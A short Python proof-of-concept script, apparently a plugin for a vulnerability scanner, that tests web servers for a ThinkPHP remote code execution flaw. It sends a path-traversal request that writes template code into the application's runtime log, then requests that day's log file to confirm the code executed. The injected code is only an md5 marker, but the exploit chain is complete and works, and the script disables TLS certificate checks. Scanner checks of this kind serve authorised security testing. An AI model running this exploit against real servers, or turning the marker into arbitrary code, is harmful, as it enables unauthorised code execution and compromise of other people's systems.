#!/usr/bin/env python
# coding=utf-8
import datetime
from urllib.parse import urljoin

import requests

from utils import get_pocdict

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
}

payload1 = "index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]"
payload2 = "index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{0}.log"


async def thinkphp_index_showid_rce_verify(url):
    pocdict = get_pocdict(vulnname=__name__)
    try:
        vurl = urljoin(url, payload1)
        _ = requests.get(vurl, headers=headers, timeout=15, verify=False)
        time_now = datetime.datetime.now().strftime("%Y_%m_%d")[2:]
        resp = requests.get(url=urljoin(url, payload2.format(time_now)), headers=headers, timeout=15, verify=False)
        if '56540676a129760a3' in resp.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['proof'] = '56540676a129760a3 found'
            pocdict['response'] = resp.text
    except Exception as e:
        pocdict['exception'] = str(e)
    return pocdict
